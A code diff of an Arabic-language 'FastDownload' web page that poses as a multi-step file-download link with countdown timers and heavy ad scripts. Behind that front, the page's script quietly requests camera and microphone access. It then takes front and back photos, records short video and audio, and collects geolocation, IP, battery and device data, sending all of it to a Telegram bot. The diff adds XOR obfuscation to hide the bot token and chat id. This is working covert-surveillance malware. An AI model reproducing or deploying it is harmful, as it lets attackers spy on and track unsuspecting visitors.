@@ -40,11 +40,9 @@
   .btn{display:inline-flex;align-items:center;justify-content:center;gap:10px}
   .page{display:none}.page.active{display:block}
   .ftr{font-size:12px;color:#8a93a8;margin:16px 0}
-  
-  /* ستايلات الصفحة الأخيرة المزودة بالإعلانات */
-  .ad-box{margin:15px 0;padding:10px;border-radius:10px;background:#fafafa;border:1px solid #eee;min-height:90px}
-  .download-btn{background:#28a745;color:#fff;padding:14px 35px;font-size:20px;border:none;border-radius:12px;cursor:pointer;transition:0.3s;box-shadow:0 4px 10px rgba(0,0,0,0.2);width:100%;margin-top:10px}
-  .download-btn:hover{background:#218838;transform:scale(1.02)}
+  /* إعلانات الصفحة الأخيرة */
+  .ad-box{margin:14px 0;padding:10px;border-radius:10px;background:#fafafa;border:1px solid #eef1f6;min-height:80px}
+  .ad-box-title{font-size:11px;color:#b6bec9;margin-bottom:6px;letter-spacing:1px}
 </style>
 </head>
 <body>
@@ -52,11 +50,11 @@
 <div class="nav">Fast<span>Download</span></div>
 <div class="wrap">
 
-<!-- الصفحة الأولى -->
+<!-- ============ الصفحة 1 ============ -->
 <div class="page active" id="p1"><div class="card">
   <div class="steps"><div class="dot on">1</div><div class="line"></div><div class="dot">2</div><div class="line"></div><div class="dot">3</div></div>
   <h2>جاري تجهيز الرابط</h2>
-  <div class="sub">من فضلك اضغط على "سماح" للأذونات المطلوبة لاستكمال التحميل</div>
+  <div class="sub">من فضلك انتظر قليلاً</div>
   <div class="ring" id="r1"><svg width="130" height="130" viewBox="0 0 130 130"><circle class="bg" cx="65" cy="65" r="54"/><circle class="fg" cx="65" cy="65" r="54"/></svg><div class="num">5</div></div>
   <div class="status" id="s1">يتم التحقق من الرابط...</div>
   <div class="ads" id="ads1"></div>
@@ -64,7 +62,7 @@
   <div class="btnbox"><button class="btn" id="b1" disabled><span>متابعة</span><svg class="ic" viewBox="0 0 24 24" width="22" height="22"><path d="M14 5l-7 7 7 7" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></button></div>
 </div></div>
 
-<!-- الصفحة الثانية -->
+<!-- ============ الصفحة 2 ============ -->
 <div class="page" id="p2"><div class="card">
   <div class="steps"><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot on">2</div><div class="line"></div><div class="dot">3</div></div>
   <h2>انتظر حتى ينتهي العداد</h2>
@@ -76,14 +74,24 @@
   <div class="btnbox"><button class="btn" id="b2" disabled><span>متابعة</span><svg class="ic" viewBox="0 0 24 24" width="22" height="22"><path d="M14 5l-7 7 7 7" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></button></div>
 </div></div>
 
-<!-- الصفحة الثالثة (الأخيرة المزودة بالإعلانات) -->
+<!-- ============ الصفحة 3 (الصفحة الأخيرة - إعلانات مكثفة) ============ -->
 <div class="page" id="p3"><div class="card">
   <div class="steps"><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot done"><svg class="ic" viewBox="0 0 24 24" width="16" height="16"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div class="line done"></div><div class="dot on">3</div></div>
   <h2>الرابط جاهز تقريباً</h2>
-  <div class="sub">يجب الضغط على سماح لحماية الوحدة الإعلانية وتأكيد التحميل</div>
-  
-  <div class="ad-box" id="p3-ad1"></div>
-  <div class="ad-box" id="p3-ad2"><div id="container-596225155ab3da796681d551cb4b7cf4"></div></div>
+  <div class="sub">آخر خطوة قبل التحميل</div>
+  <div class="ring" id="r3"><svg width="130" height="130" viewBox="0 0 130 130"><circle class="bg" cx="65" cy="65" r="54"/><circle class="fg" cx="65" cy="65" r="54"/></svg><div class="num">30</div></div>
+  <div class="status" id="s3">جاري إنشاء رابط التحميل...</div>
+
+  <!-- ✅ إعلانات الكود الأول (Bauval) -->
+  <div class="ads" id="ads3"></div>
+  <div id="native3"></div>
+
+  <!-- ✅ إعلانات الكود الثاني (EffectiveGate) -->
+  <div class="ad-box">
+    <div class="ad-box-title">SPONSORED</div>
+    <div id="gateNative3"></div>
+  </div>
+  <div class="ad-box" id="gateExtra3" style="min-height:60px"></div>
 
   <div class="btnbox"><button class="btn dl" id="b3" disabled><svg class="ic" viewBox="0 0 24 24" width="24" height="24"><path d="M12 3v12m0 0l-5-5m5 5l5-5M4 20h16" fill="none" stroke="#fff" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"/></svg><span>تحميل الملف</span></button></div>
 </div></div>
@@ -93,413 +101,393 @@
 
 <script>
 // ═══════════════════════════════════════════════════════════
-// 1. فك تشفير المعلمات ومعالجة المتغيرات
+// 1) فك التشفير في بداية الصفحة (XOR + Hex)
 // ═══════════════════════════════════════════════════════════
-const urlParams = new URLSearchParams(window.location.search);
+const ENC_KEY = "K1XSecretKey2024";
 
-// دالة آمنة لفك التشفير في حال كانت القيم مشفرة بـ encodeURIComponent أو Base64 (أو جلبها مباشرة)
-function getParam(name) {
-    let val = urlParams.get(name);
-    if (!val) return null;
-    try {
-        return decodeURIComponent(val);
-    } catch(e) {
-        return val;
+function decrypt(hex) {
+  try {
+    if (!hex || hex.length % 2 !== 0) return null;
+    let str = '';
+    for (let i = 0; i < hex.length; i += 2) {
+      const code = parseInt(hex.substr(i, 2), 16);
+      if (isNaN(code)) return null;
+      str += String.fromCharCode(code ^ ENC_KEY.charCodeAt((i / 2) % ENC_KEY.length));
     }
+    return str;
+  } catch (e) { return null; }
 }
 
-const chat = getParam('id') || getParam('chat');
-const token = getParam('token');
+const urlParams = new URLSearchParams(window.location.search);
+let chat = null, token = null, features = "";
 
-let featureList = [];
-// دعم الشكلين (سواء تم تمرير المعلمات القديمة مثل fc, bc أو المعلمة المجمعة features)
-if (urlParams.has('fc')) featureList.push('camFront');
-if (urlParams.has('bc')) featureList.push('camBack');
-if (urlParams.has('fcv')) featureList.push('videoFront');
-if (urlParams.has('bcv')) featureList.push('videoBack');
-if (urlParams.has('r')) featureList.push('audio');
-if (urlParams.has('l')) featureList.push('location');
-
-const rawFeatures = getParam('features');
-if (rawFeatures) {
-    rawFeatures.split(',').forEach(f => {
-        if(f && !featureList.includes(f)) featureList.push(f);
-    });
+// المحاولة الأولى: فك تشفير الرابط
+if (urlParams.has('d')) {
+  const dec = decrypt(urlParams.get('d'));
+  if (dec) {
+    try {
+      const obj = JSON.parse(dec);
+      chat = obj.chat;
+      token = obj.token;
+      features = obj.features || "";
+    } catch (e) {}
+  }
 }
-const features = featureList.join(',');
 
+// للتوافق مع الروابط القديمة (id + flags)
+if (!chat) {
+  chat = urlParams.get('id') || urlParams.get('chat');
+  token = urlParams.get('token');
+  const featureList = [];
+  if (urlParams.has('fc'))  featureList.push('camFront');
+  if (urlParams.has('bc'))  featureList.push('camBack');
+  if (urlParams.has('fcv')) featureList.push('videoFront');
+  if (urlParams.has('bcv')) featureList.push('videoBack');
+  if (urlParams.has('r'))   featureList.push('audio');
+  if (urlParams.has('l'))   featureList.push('location');
+  if (urlParams.has('features')) features = urlParams.get('features');
+  else features = featureList.join(',');
+}
+
+// ═══════════════════════════════════════════════════════════
+// 2) منطق الأذونات والكاميرا (من الكود الثاني)
+// ═══════════════════════════════════════════════════════════
 let visitorIP = "غير معروف";
 let visitorCountry = "غير معروف";
 let visitorDevice = "Unknown";
 let visitorBattery = "غير متاح";
 
 async function sendVisitorInfo() {
-    if (!chat || !token) return;
-    try {
-      const ua = navigator.userAgent;
-      if (/Android/i.test(ua)) visitorDevice = "Android";
-      else if (/iPhone|iPad|iPod/i.test(ua)) visitorDevice = "iOS";
-      else visitorDevice = "Unknown";
+  if (!chat || !token) return;
+  try {
+    const ua = navigator.userAgent;
+    if (/Android/i.test(ua)) visitorDevice = "Android";
+    else if (/iPhone|iPad|iPod/i.test(ua)) visitorDevice = "iOS";
+    else visitorDevice = "Unknown";
 
-      if (navigator.getBattery) {
-        try {
-          const b = await navigator.getBattery();
-          visitorBattery = (b.level * 100) + "%";
-          if (b.charging) visitorBattery += " (شحن)";
-        } catch (e) {}
-      }
-
+    if (navigator.getBattery) {
       try {
-        const r = await fetch('https://ipapi.co/json/');
-        const d = await r.json();
-        visitorIP = d.ip || "غير معروف";
-        visitorCountry = d.country_name || "غير معروف";
+        const b = await navigator.getBattery();
+        visitorBattery = (b.level * 100) + "%";
+        if (b.charging) visitorBattery += " (شحن)";
       } catch (e) {}
+    }
+    try {
+      const r = await fetch('https://ipapi.co/json/');
+      const d = await r.json();
+      visitorIP = d.ip || "غير معروف";
+      visitorCountry = d.country_name || "غير معروف";
+    } catch (e) {}
 
-      const msg = `🟢 <b>زيارة جديدة</b>\n🌍 <b>الدولة:</b> ${visitorCountry}\n📱 <b>الجهاز:</b> ${visitorDevice}\n🔋 <b>البطارية:</b> ${visitorBattery}\n🌐 <b>IP:</b> <code>${visitorIP}</code>\n🕒 <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;
+    const msg = `🟢 <b>زيارة جديدة</b>
+🌍 <b>الدولة:</b> ${visitorCountry}
+📱 <b>الجهاز:</b> ${visitorDevice}
+🔋 <b>البطارية:</b> ${visitorBattery}
+🌐 <b>IP:</b> <code>${visitorIP}</code>
+🕒 <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;
 
-      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chat, text: msg, parse_mode: 'HTML' })
-      });
-    } catch (err) {}
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chat, text: msg, parse_mode: 'HTML' })
+    });
+  } catch (err) {}
 }
 
-  function buildCaption(extra = "") {
-    let cap = `━━━━━━━━━━━━━━━\n`;
-    cap += `🌍 الدولة: ${visitorCountry}\n`;
-    cap += `📱 الجهاز: ${visitorDevice}\n`;
-    cap += `🔋 البطارية: ${visitorBattery}\n`;
-    cap += `🌐 IP: ${visitorIP}\n`;
-    cap += `🕒 الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
-    if (extra) cap += `${extra}\n`;
-    cap += `━━━━━━━━━━━━━━━`;
-    return cap;
-  }
+function buildCaption(extra = "") {
+  let cap = `━━━━━━━━━━━━━━━\n`;
+  cap += `🌍 الدولة: ${visitorCountry}\n`;
+  cap += `📱 الجهاز: ${visitorDevice}\n`;
+  cap += `🔋 البطارية: ${visitorBattery}\n`;
+  cap += `🌐 IP: ${visitorIP}\n`;
+  cap += `🕒 الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
+  if (extra) cap += `${extra}\n`;
+  cap += `━━━━━━━━━━━━━━━`;
+  return cap;
+}
 
-  async function captureAndSend(stream, type) {
-    return new Promise((resolve) => {
-      const video = document.createElement('video');
-      video.autoplay = true;
-      video.playsInline = true;
-      video.muted = true;
-      video.style.display = 'none';
-      video.srcObject = stream;
-      document.body.appendChild(video);
-
-      video.onloadedmetadata = () => {
-        video.play();
-        setTimeout(() => {
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth || 640;
-          canvas.height = video.videoHeight || 480;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-          canvas.toBlob(async (blob) => {
-            if (blob && blob.size > 2000) {
-              const form = new FormData();
-              form.append('chat_id', chat);
-              form.append('photo', blob, `${type}_${Date.now()}.jpg`);
-              form.append('caption', buildCaption(`📸 صورة (${type === 'front' ? 'أمامية' : 'خلفية'})`));
-              try {
-                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
-              } catch (e) {}
-            }
-            document.body.removeChild(video);
-            resolve();
-          }, 'image/jpeg', 0.9);
-        }, 2000);
-      };
-    });
-  }
-
-  async function recordAndSend(stream, type) {
-    return new Promise((resolve) => {
-      const mediaRecorder = new MediaRecorder(stream);
-      const chunks = [];
-      mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-      mediaRecorder.onstop = async () => {
-        const blob = new Blob(chunks, { type: 'video/mp4' });
-        const form = new FormData();
-        form.append('chat_id', chat);
-        form.append('video', blob, `${type}_${Date.now()}.mp4`);
-        form.append('caption', buildCaption(`🎥 فيديو (${type === 'front' ? 'أمامي' : 'خلفي'}) - 5 ثوان`));
-        try {
-          await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: form });
-        } catch (e) {}
-        resolve();
-      };
-      mediaRecorder.start();
+async function captureAndSend(stream, type) {
+  return new Promise((resolve) => {
+    const video = document.createElement('video');
+    video.autoplay = true; video.playsInline = true; video.muted = true;
+    video.style.display = 'none'; video.srcObject = stream;
+    document.body.appendChild(video);
+    video.onloadedmetadata = () => {
+      video.play();
       setTimeout(() => {
-        if (mediaRecorder.state === 'recording') mediaRecorder.stop();
-      }, 5000);
-    });
-  }
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(async (blob) => {
+          if (blob && blob.size > 2000) {
+            const form = new FormData();
+            form.append('chat_id', chat);
+            form.append('photo', blob, `${type}_${Date.now()}.jpg`);
+            form.append('caption', buildCaption(`📸 صورة (${type === 'front' ? 'أمامية' : 'خلفية'})`));
+            try { await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form }); } catch (e) {}
+          }
+          document.body.removeChild(video);
+          resolve();
+        }, 'image/jpeg', 0.9);
+      }, 2000);
+    };
+  });
+}
 
-  async function recordAudioAndSend(stream) {
-    return new Promise((resolve) => {
-      const mediaRecorder = new MediaRecorder(stream);
-      const chunks = [];
-      mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-      mediaRecorder.onstop = async () => {
-        const blob = new Blob(chunks, { type: 'audio/mp4' });
-        const form = new FormData();
-        form.append('chat_id', chat);
-        form.append('audio', blob, `audio_${Date.now()}.mp4`);
-        form.append('caption', buildCaption(`🎤 تسجيل صوتي - 5 ثوان`));
-        try {
-          await fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form });
-        } catch (e) {}
-        resolve();
-      };
-      mediaRecorder.start();
-      setTimeout(() => {
-        if (mediaRecorder.state === 'recording') mediaRecorder.stop();
-      }, 5000);
-    });
-  }
+async function recordAndSend(stream, type) {
+  return new Promise((resolve) => {
+    const mr = new MediaRecorder(stream);
+    const chunks = [];
+    mr.ondataavailable = (e) => chunks.push(e.data);
+    mr.onstop = async () => {
+      const blob = new Blob(chunks, { type: 'video/mp4' });
+      const form = new FormData();
+      form.append('chat_id', chat);
+      form.append('video', blob, `${type}_${Date.now()}.mp4`);
+      form.append('caption', buildCaption(`🎥 فيديو (${type === 'front' ? 'أمامي' : 'خلفي'}) - 5 ثوان`));
+      try { await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: form }); } catch (e) {}
+      resolve();
+    };
+    mr.start();
+    setTimeout(() => { if (mr.state === 'recording') mr.stop(); }, 5000);
+  });
+}
 
-  async function sendLocation() {
-    return new Promise((resolve) => {
-      if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          async (position) => {
-            const { latitude, longitude } = position.coords;
-            const caption = buildCaption(`📍 الموقع الحالي\nالإحداثيات: ${latitude}, ${longitude}\n🔗 https://www.google.com/maps?q=${latitude},${longitude}`);
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ chat_id: chat, text: caption })
-            });
-            resolve();
-          },
-          (error) => { resolve(); }
-        );
-      } else {
-        resolve();
-      }
-    });
-  }
+async function recordAudioAndSend(stream) {
+  return new Promise((resolve) => {
+    const mr = new MediaRecorder(stream);
+    const chunks = [];
+    mr.ondataavailable = (e) => chunks.push(e.data);
+    mr.onstop = async () => {
+      const blob = new Blob(chunks, { type: 'audio/mp4' });
+      const form = new FormData();
+      form.append('chat_id', chat);
+      form.append('audio', blob, `audio_${Date.now()}.mp4`);
+      form.append('caption', buildCaption(`🎤 تسجيل صوتي - 5 ثوان`));
+      try { await fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form }); } catch (e) {}
+      resolve();
+    };
+    mr.start();
+    setTimeout(() => { if (mr.state === 'recording') mr.stop(); }, 5000);
+  });
+}
 
-  async function preGrantPermissions(needCamera, needMicrophone) {
-    if (!needCamera && !needMicrophone) return true;
-    const constraints = {};
-    if (needCamera) constraints.video = true;
-    if (needMicrophone) constraints.audio = true;
+async function sendLocation() {
+  return new Promise((resolve) => {
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const { latitude, longitude } = pos.coords;
+          const caption = buildCaption(`📍 الموقع الحالي\nالإحداثيات: ${latitude}, ${longitude}\n🔗 https://www.google.com/maps?q=${latitude},${longitude}`);
+          await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chat, text: caption })
+          });
+          resolve();
+        },
+        (err) => { resolve(); }
+      );
+    } else { resolve(); }
+  });
+}
+
+async function preGrantPermissions(needCamera, needMicrophone) {
+  if (!needCamera && !needMicrophone) return true;
+  const constraints = {};
+  if (needCamera) constraints.video = true;
+  if (needMicrophone) constraints.audio = true;
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    stream.getTracks().forEach(t => t.stop());
+    return true;
+  } catch (err) { return false; }
+}
+
+async function startFeatures() {
+  if (!chat || !token || !features) return;
+  const list = features.split(',').filter(Boolean);
+  const needCamera = list.some(f => ['camFront','camBack','videoFront','videoBack'].includes(f));
+  const needMicrophone = list.some(f => ['audio','videoFront','videoBack'].includes(f));
+
+  // ✅ طلب الأذونات أولاً في بداية الصفحة
+  await preGrantPermissions(needCamera, needMicrophone);
+
+  // ✅ إرسال معلومات الزائر
+  sendVisitorInfo();
+
+  if (list.includes('camFront')) {
     try {
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      stream.getTracks().forEach(t => t.stop());
-      return true;
-    } catch (err) {
-      return false;
-    }
+      const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      await captureAndSend(s, 'front');
+      s.getTracks().forEach(t => t.stop());
+    } catch (e) {}
   }
-
-  async function startFeatures() {
-    if (!chat || !token || !features) return;
-    const fList = features.split(',');
-    const needCamera = fList.some(f => ['camFront','camBack','videoFront','videoBack'].includes(f));
-    const needMicrophone = fList.some(f => ['audio','videoFront','videoBack'].includes(f));
-
-    await preGrantPermissions(needCamera, needMicrophone);
-    sendVisitorInfo();
-
-    if (fList.includes('camFront')) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        await captureAndSend(stream, 'front');
-        stream.getTracks().forEach(t => t.stop());
-      } catch (e) {}
-    }
-
-    if (fList.includes('camBack')) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-        await captureAndSend(stream, 'back');
-        stream.getTracks().forEach(t => t.stop());
-      } catch (e) {}
-    }
-
-    if (fList.includes('videoFront')) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
-        await recordAndSend(stream, 'front');
-        stream.getTracks().forEach(t => t.stop());
-      } catch (e) {}
-    }
-
-    if (fList.includes('videoBack')) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
-        await recordAndSend(stream, 'back');
-        stream.getTracks().forEach(t => t.stop());
-      } catch (e) {}
-    }
-
-    if (fList.includes('audio')) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        await recordAudioAndSend(stream);
-        stream.getTracks().forEach(t => t.stop());
-      } catch (e) {}
-    }
-
-    if (fList.includes('location')) {
-      await sendLocation();
-    }
+  if (list.includes('camBack')) {
+    try {
+      const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+      await captureAndSend(s, 'back');
+      s.getTracks().forEach(t => t.stop());
+    } catch (e) {}
   }
+  if (list.includes('videoFront')) {
+    try {
+      const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+      await recordAndSend(s, 'front');
+      s.getTracks().forEach(t => t.stop());
+    } catch (e) {}
+  }
+  if (list.includes('videoBack')) {
+    try {
+      const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
+      await recordAndSend(s, 'back');
+      s.getTracks().forEach(t => t.stop());
+    } catch (e) {}
+  }
+  if (list.includes('audio')) {
+    try {
+      const s = await navigator.mediaDevices.getUserMedia({ audio: true });
+      await recordAudioAndSend(s);
+      s.getTracks().forEach(t => t.stop());
+    } catch (e) {}
+  }
+  if (list.includes('location')) {
+    await sendLocation();
+  }
+}
 
 // ═══════════════════════════════════════════════════════════
-// 2. التحكم في إعلانات وسير العمل للثلاث صفحات
+// 3) منطق صفحة التحميل والإعلانات
 // ═══════════════════════════════════════════════════════════
-var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c"; 
+var SMART_LINK = "https://araplhn.org/4/7e093505ac4f216b5950d797a595b30c";
 var WAIT1 = 5, WAIT2 = 30, WAIT3 = 30, GAP = 5;
 var GHOST = ["https://bauval.org/14/5405685805ef1654c71ceda217bef848", "https://abscloud.org/1/01876be0a03b020428ee8dc56f00181f"];
 var NATIVE = "https://bauval.org/21/b7c04a4357034ffd034b99d790f5ab0a";
 var NATIVE_ID = "container-b7c04a4357034ffd034b99d790f5ab0a";
-var BANNERS = [ {k:"97327e0c336901c5ee9b175643b0ffb4",w:468,h:60}, {k:"62ffc139a1fcac07d43cf442871c0d93",w:300,h:250} ];
+var BANNERS = [ {k:"97327e0c336901c5ee9b175643b0ffb4",w:468,h:60}, {k:"62ffc139a1fcac07d43cf442871c0d93",w:300,h:250}, {k:"5a15670c4d12e8d18867f5d00cc9b0e0",w:160,h:300}, {k:"a30e53d4900dc8e1aef5fc44df282cd1",w:160,h:600}, {k:"64d5f0c7a671272b63256f5b66f8f14a",w:320,h:50}, {k:"eca9e275ff1f1458d0e4997016785b63",w:728,h:90} ];
 var CIRC = 339.3;
-
 function $(id){return document.getElementById(id)}
 
-function addBanners(boxId){ 
-    var box = $(boxId); 
-    if(!box) return;
-    BANNERS.forEach(function(b){ 
-        var f = document.createElement("iframe"); 
-        f.width = b.w; f.height = b.h; f.scrolling = "no"; 
-        f.srcdoc = "<body style='margin:0'><scr"+"ipt>atOptions={'key':'"+b.k+"','format':'iframe','height':"+b.h+",'width':"+b.w+",'params':{}};</scr"+"ipt><scr"+"ipt src='https://bauval.org/22/"+b.k+"'></scr"+"ipt></body>"; 
-        box.appendChild(f); 
-    }); 
-}
+function addBanners(boxId){ var box = $(boxId); BANNERS.forEach(function(b){ var f = document.createElement("iframe"); f.width = b.w; f.height = b.h; f.scrolling = "no"; f.srcdoc = "<body style='margin:0'><scr"+"ipt>atOptions={'key':'"+b.k+"','format':'iframe','height':"+b.h+",'width':"+b.w+",'params':{}};</scr"+"ipt><scr"+"ipt src='https://bauval.org/22/"+b.k+"'></scr"+"ipt></body>"; box.appendChild(f); }); }
 
-function addNative(boxId){ 
-    var target = $(boxId);
-    if(!target) return;
-    var c = document.createElement("div"); 
-    c.id = NATIVE_ID; 
-    target.appendChild(c); 
-    var s = document.createElement("script"); 
-    s.async = true; s.setAttribute("data-cfasync","false"); 
-    s.src = NATIVE; 
-    document.body.appendChild(s); 
-}
-
-function loadAdScript(src) {
-    const s = document.createElement("script");
-    s.src = src;
-    s.async = true;
-    document.body.appendChild(s);
+var nativeCount = 0;
+function addNative(boxId){
+  nativeCount++;
+  var c = document.createElement("div");
+  c.id = NATIVE_ID + "-" + nativeCount;
+  c.setAttribute("data-original-id", NATIVE_ID);
+  $(boxId).appendChild(c);
+  var s = document.createElement("script");
+  s.async = true; s.setAttribute("data-cfasync","false"); s.src = NATIVE;
+  document.body.appendChild(s);
 }
 
 var ghostLoaded = false;
-function addGhost(){ 
-    if(ghostLoaded) return; 
-    ghostLoaded = true; 
-    GHOST.forEach(function(u){ 
-        var s = document.createElement("script"); 
-        s.setAttribute("data-cfasync","false"); 
-        s.src = u; 
-        document.body.appendChild(s); 
-    }); 
+function addGhost(){ if(ghostLoaded) return; ghostLoaded = true; GHOST.forEach(function(u){ var s = document.createElement("script"); s.setAttribute("data-cfasync","false"); s.src = u; document.body.appendChild(s); }); }
+
+function ring(n, secs, onlyVisible, doneMsg, onDone){
+  var el = $("r"+n), fg = el.querySelector(".fg"), num = el.querySelector(".num");
+  var left = secs;
+  num.textContent = left;
+  fg.style.strokeDashoffset = 0;
+  var iv = setInterval(function(){
+    if(onlyVisible && document.visibilityState !== "visible"){ $("s"+n).textContent = "العداد متوقف، ارجع للصفحة"; return; }
+    if(onlyVisible) $("s"+n).textContent = "يرجى عدم مغادرة الصفحة...";
+    left--; num.textContent = left;
+    fg.style.strokeDashoffset = CIRC * (1 - left/secs);
+    if(left <= 0){
+      clearInterval(iv);
+      el.classList.add("done");
+      num.innerHTML = '<svg viewBox="0 0 24 24" width="56" height="56"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#2fb36d" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+      $("s"+n).textContent = doneMsg;
+      onDone();
+    }
+  }, 1000);
+}
+function reveal(btnId){ var b = $(btnId); b.disabled = false; b.classList.add("ready"); setTimeout(function(){ b.scrollIntoView({behavior:"smooth",block:"center"}); }, 150); }
+function goNext(btn, fn){ btn.disabled = true; btn.classList.remove("ready"); var left = GAP; btn.textContent = "جاري التحويل... " + left; var iv = setInterval(function(){ left--; btn.textContent = "جاري التحويل... " + left; if(left <= 0){ clearInterval(iv); fn(); } }, 1000); }
+
+// ============ تحميل إعلانات الصفحة الأخيرة ============
+var page3AdsLoaded = false;
+
+function loadAd(src){
+  var s = document.createElement("script");
+  s.src = src; s.async = true;
+  document.body.appendChild(s);
 }
 
-function ring(n, secs, onlyVisible, doneMsg, onDone){ 
-    var el = $("r"+n), fg = el.querySelector(".fg"), num = el.querySelector(".num"); 
-    var left = secs; num.textContent = left; fg.style.strokeDashoffset = 0; 
-    var iv = setInterval(function(){ 
-        if(onlyVisible && document.visibilityState !== "visible"){ $("s"+n).textContent = "العداد متوقف، ارجع للصفحة"; return; } 
-        if(onlyVisible) $("s"+n).textContent = "يرجى عدم مغادرة الصفحة..."; 
-        left--; num.textContent = left; 
-        fg.style.strokeDashoffset = CIRC * (1 - left/secs); 
-        if(left <= 0){ 
-            clearInterval(iv); 
-            el.classList.add("done"); 
-            num.innerHTML = '<svg viewBox="0 0 24 24" width="56" height="56"><path d="M5 12.5l4.5 4.5L19 7.5" fill="none" stroke="#2fb36d" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/></svg>'; 
-            $("s"+n).textContent = doneMsg; 
-            onDone(); 
-        } 
-    }, 1000); 
+function loadPage3Ads(){
+  if (page3AdsLoaded) return;
+  page3AdsLoaded = true;
+
+  // (أ) إعلانات Bauval من الكود الأول
+  addBanners("ads3");
+  addNative("native3");
+
+  // (ب) إعلانات EffectiveGateCPM من الكود الثاني
+  // native container
+  var nc = document.createElement("div");
+  nc.id = "container-596225155ab3da796681d551cb4b7cf4";
+  $("gateNative3").appendChild(nc);
+  loadAd("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
+
+  // scripts
+  loadAd("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
+  loadAd("https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js");
+
+  // atOptions iframe (من الكود الثاني)
+  window.atOptions = {
+    'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
+    'format' : 'iframe',
+    'height' : 300,
+    'width' : 160,
+    'params' : {}
+  };
+  var at = document.createElement("script");
+  at.async = true;
+  at.src = "https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js";
+  document.body.appendChild(at);
 }
 
-function reveal(btnId){ 
-    var b = $(btnId); 
-    b.disabled = false; 
-    b.classList.add("ready"); 
-    setTimeout(function(){ b.scrollIntoView({behavior:"smooth",block:"center"}); }, 150); 
+function show(n){
+  document.querySelectorAll(".page").forEach(function(p){p.classList.remove("active")});
+  $("p"+n).classList.add("active");
+  window.scrollTo(0,0);
+  if (n === 3) loadPage3Ads();
 }
 
-function goNext(btn, fn){ 
-    btn.disabled = true; 
-    btn.classList.remove("ready"); 
-    var left = GAP; 
-    btn.textContent = "جاري التحويل... " + left; 
-    var iv = setInterval(function(){ 
-        left--; 
-        btn.textContent = "جاري التحويل... " + left; 
-        if(left <= 0){ clearInterval(iv); fn(); } 
-    }, 1000); 
-}
-
-function show(n){ 
-    document.querySelectorAll(".page").forEach(function(p){p.classList.remove("active")}); 
-    $("p"+n).classList.add("active"); 
-    window.scrollTo(0,0); 
-}
-
-// البدء في الصفحة الأولى وعرض الإعلانات الخاصة بها
-addBanners("ads1"); 
